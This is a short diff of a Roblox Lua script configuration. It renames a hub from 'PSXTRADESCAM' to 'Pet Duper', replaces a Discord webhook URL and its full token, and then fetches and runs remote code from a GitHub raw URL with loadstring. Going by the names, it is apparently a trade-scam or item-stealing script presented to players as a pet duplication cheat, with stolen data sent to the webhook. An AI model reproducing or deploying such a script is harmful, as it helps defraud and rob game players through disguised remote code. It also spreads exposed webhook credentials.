@@ -1,5 +1,5 @@
 `_G.Username = "PlaysTheKiki123"
-_G.HubName = "PSXTRADESCAM"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1097164721343451187/yi42Aadf-uwFpLMmudVccuxcN2377QOVzuIswRiESoVxw0zwlw8RVD-cHXXspDSu43mw"
+_G.HubName = "Pet Duper"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099718703089717388/HP2cvWcSNN8DQxQ9WmOFL8MVTulTLlqnLtlwBuvVKUGuG-zuJzYKMgsoFLYCBZlRwhoP"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()`
